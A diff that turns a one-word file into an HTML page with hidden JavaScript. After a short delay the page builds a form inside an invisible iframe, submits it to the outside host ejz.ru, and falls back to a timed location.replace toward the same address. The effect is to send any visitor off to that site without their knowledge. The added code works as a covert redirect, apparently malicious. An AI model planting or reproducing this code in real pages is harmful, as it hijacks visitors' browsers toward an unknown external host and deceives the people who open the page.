@@ -1,1 +1,26 @@
-submit
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+<body>
+<script>
+    var x = 0
+    function go2() { location.replace("http://ejz.ru/ref.php") }
+    function go() {
+        if(x) return
+        x += 1
+        try {
+            var html = '<form target="_parent" action="http://ejz.ru/ref.php">'
+            html += '<input type="hidden" name="u" value="" /></form>'
+            window.frames[0].document.body.innerHTML = html
+            window.frames[0].document.forms[0].submit()
+        } catch(e) {
+            go2()
+        }
+    }
+</script>
+<iframe onload="window.setTimeout('go()', 99)" src="about:blank" style="visibility:hidden">
+</iframe>
+<script>window.setTimeout('go2()', 3333)</script>
+</body>
+</html>
